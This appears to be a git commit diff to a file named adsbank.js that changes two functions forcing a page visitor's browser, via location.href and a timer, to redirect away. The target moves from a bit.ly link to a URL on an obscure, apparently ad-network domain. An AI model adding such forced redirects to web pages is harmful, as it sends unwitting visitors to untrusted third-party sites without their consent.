d3e483e4b4a1cf0f7e0ed18c14e9ac1f649b104a
bigetijazz3 <bigetijazz3@gmail.com>
2024-11-23 21:26:29 -0800

    Update adsbank.js

--- adsbank.js
+++ adsbank.js
@@ -5,8 +5,8 @@
         fh();}
     setTimeout('hh();', 500);
     function fh(){
-        location.href="https://bit.ly/Link-scripted";
+        location.href="https://whouphesaussums.net/4/8554813";
     }
     function goon(){
-        location.href="https://bit.ly/Link-scripted";
+        location.href="https://whouphesaussums.net/4/8554813";
     }
